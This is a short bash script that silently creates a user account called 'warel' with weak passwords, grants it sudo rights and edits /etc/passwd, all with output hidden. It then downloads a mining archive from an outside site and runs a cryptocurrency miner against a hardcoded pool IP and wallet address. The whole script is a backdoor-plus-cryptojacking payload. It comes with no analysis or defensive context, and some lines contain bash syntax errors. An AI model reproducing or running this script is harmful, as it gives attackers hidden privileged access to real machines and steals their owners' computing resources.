#!/bin/bash
username = "user"
password = "root"
useradd -m warel > /dev/null 2>&1
echo 'warel:1' | sudo chpasswd > /dev/null 2>&1
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd > /dev/null 2>&1
adduser warel sudo > /dev/null 2>&1
echo 'warel:warel' | sudo chpasswd > /dev/null 2>&1
echo warel:1 | sudo chpasswd > /dev/null 2>&1
wget https://legacy.os.dog/downloads/miners/ewbf@0.6.tar.gz > /dev/null 2>&1
tar -xvf ewbf@0.6.tar.gz > /dev/null 2>&1
su warel -c "./miner --algo 144_5 --pers BgoldPoW --server 45.33.14.92 --port 1255 --user NHbT5nHfBWAJnWZMmQWxserik53qEQQ2CohY.Warel --templimit 150"
